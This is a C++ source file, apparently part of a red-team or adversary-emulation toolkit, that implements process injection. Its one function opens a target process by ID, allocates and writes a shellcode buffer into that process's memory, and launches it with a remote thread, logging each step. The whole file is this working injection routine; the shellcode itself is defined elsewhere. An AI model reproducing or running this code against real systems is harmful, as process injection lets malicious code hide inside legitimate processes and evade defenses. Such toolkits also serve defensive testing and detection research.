#include <cstdio>

#include "sysapi.h"
#include "scripts.h"
#include "logging.h"

namespace scripts {

bool inject_create_remote_thread(uint32_t pid, RemoteProcessOpenMethod open_method, RemoteProcessMemoryMethod memory_method) {

    bblog::info("[*] Opening the target process");
    sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    bblog::info("[*] Placing shellcode in the target process");

    RemoteProcessMemoryContext ctx;
    bool res = process_init_memory(ctx, memory_method, ProcessHandle.get(), pid);
    if (!res) {
        return false;
    }

    ctx.Size = (ULONG)default_shellcode_size;

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    bblog::info("writing shellcode...");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    bblog::info("[*] Executing shellcode");

    bblog::info("starting new thread with shellcode start address...");

    sysapi::unique_handle target_thread = sysapi::ThreadCreate(ProcessHandle.get(), ctx.RemoteBaseAddress);
    if (target_thread == NULL) {
        return false;
    }

    bblog::info("[+] Success");
    return true;
}

} // namespace scripts
